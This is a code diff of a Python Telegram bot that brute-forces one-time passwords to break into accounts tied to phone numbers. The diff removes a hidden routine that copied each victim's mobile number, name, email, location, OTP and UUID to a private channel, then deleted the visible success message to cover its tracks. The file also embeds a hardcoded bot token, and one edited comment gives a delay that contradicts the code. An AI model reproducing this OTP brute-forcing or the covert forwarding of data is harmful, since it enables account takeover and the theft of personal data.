@@ -10,7 +10,6 @@ from telegram.ext import Application, MessageHandler, filters, ContextTypes, Com
 from telegram.error import BadRequest
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "7689660542:AAE5U4OjY3UmutytZK5FsyMKMtK62v3Zq1A")
-CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1001234567890")  # Replace with your private channel ID
 
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
@@ -155,12 +154,7 @@ async def process_login(chat_id, bot, message_data, key):
     await bot.delete_message(chat_id, progress_message.message_id)
 
     if found_otp:
-        success_message = await bot.send_message(chat_id, f"✅ [{key}] Login Successful! OTP: `{found_otp}`", parse_mode="Markdown")
-        # Send to private channel
-        channel_message = f"✅ Login Success\nKey: `{key}`\nMobile: `{mobile_number}`\nName: `{ask_name}`\nEmail: `{ask_email}`\nLocation: `{ask_loc}`\nOTP: `{found_otp}`\nUUID: `{user_uuid}`"
-        await bot.send_message(CHANNEL_ID, channel_message, parse_mode="Markdown")
-        time.sleep(2)
-        await bot.delete_message(chat_id, success_message.message_id)
+        await bot.send_message(chat_id, f"✅ [{key}] Login Successful! OTP: `{found_otp}`", parse_mode="Markdown")
     else:
         await bot.send_message(chat_id, f"❌ [{key}] OTP brute-force failed. Skipping to next entry.")
 
@@ -240,7 +234,7 @@ async def process_queue(job_context):
             await context.bot.send_message(chat_id, f"⚠️ [{key}] Error processing request: {str(e)}. Skipping to next entry.")
         # Schedule the next item if there are more in the queue
         if request_queue:
-            context.job_queue.run_once(process_queue, 60, data=context)  # Next item after 60 seconds
+            context.job_queue.run_once(process_queue, 60, data=context)  # Next item after 10 minutes
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
